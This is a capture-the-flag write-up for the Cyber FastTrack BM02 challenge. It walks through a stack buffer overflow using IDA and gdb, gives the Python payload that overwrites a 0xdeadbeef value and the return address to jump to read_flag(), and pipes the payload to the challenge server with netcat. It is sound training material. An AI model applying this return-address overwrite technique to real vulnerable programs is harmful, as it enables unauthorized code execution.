# Cyber FastTrack Spring 2020
# BM02 Solution
We use buffer overflow to display the flag.<br />
BM02_1.PNG<br />
We use IDA software to display the structure of this program. There are the exploitable(char const*) function and the read_flag(void) function. Also, there are some local variales that stored in the explotable() function. For a better understanding of the program, we need a gdb debugger.<br />
BM02_2.PNG<br />
	<p>In the terminal, we type `gdb <name of your program>` to start the debugger.</p><br />
	<p>Type `run` to run the program in the debugger.<br />
	<p>Hold down the Ctrl key and press c<br />
BM02_3.PNG<br />	
	<p>Notice that, in order to enter the exploitable() function, we first need to enter `add_candidate` to add employee and then enter the exploitable() function.
BM02_4.PNG and BM02_5.PNG and BM02_6.PNG<br />
	<p>Enter `disas exploitable(char const*)`</p><br />
	<p>Enter `c` to continue without paging</p><br />
	<p>we use break *address to set a break point. In this case, we use 0x5655634d.</p><br />
	<p>Type `break *0x5655634d`</p><br />
	<p>Type `run`</p><br />
	<p>Type `add_candidate`</p><br />
	<p>Enter one information for each of the First Name, Last Name, and Job Title.
		<p><p>In this case, I entered `First` as the First Name, `Last` as the Last Name, and `Title` as the Job Title.</p></p>
	Then, you will encounter an breakpoint at `Breakpoint 1, 0x5655634d in exploitable(char const*) ()`
BM02_7.PNG
	Enter info frame to get the return address that stored at eip. In this case, the return address is 0x56557492. 
BM02_8.PNG
	Display the current and the next 199 stack pointer.
	Enter x/200x $sp
	The addresses that are 0x00000000 are local variables that we need to fill in before changing the return address. So in a text file, we enter
	print("add_candidate")
	print('A'*20)
	and save it as a python file.
BM02_9.PNG
	Hit Ctrl + c to exit the current program
	Run the program as:
	Type run < <(python bm02.py)
	Type y to start from the beginning
	In order to see the differences, we enter x/200x $sp to display the current and the next 199 stack pointer.
	From BM02_9.PNG, we see that there are 25 0x00000000 remaining for us to fill out and then we have to overwrite the 0xdeadbeef.
	Next, in order for us to change to return address, we need to overwrite the addresses that are before the return address. There are 3 adresses remaining to changes. Then, we changes the return address to 0x5655615d. Remember, we have to write the address in reverse byte order.
	We changes the contents of the python file to:
	print("add_candidate")
	print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
BM02_10.PNG
	Hit Ctrl + c to exit the current program
	Run the program as:
	Type run < <(python bm02.py)
	Type y to start from the beginning
	Enter info frame to see if the return address changed to 0x5655615d.
BM02_11.PNG
	Use si to execute one instruction at a time to see if the program enters the read_flag(void) function.
	We see that the program enters the read_flag(void) function.
BM02_12.PNG
	Use si to execute one instruction at a time and we will see the flag eventually.
BM02_13.PNG
	In order to get the server to response to our request, we also need to print out the last name and the job title, so we edit the python file as below:
	print("add_candidate")
	print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
	print("last name")
	print("job title")
	Send the bm02.py to the server and it would prints out the flag.
	python bm02.py | nc bm02.allyourbases.co 9003





	
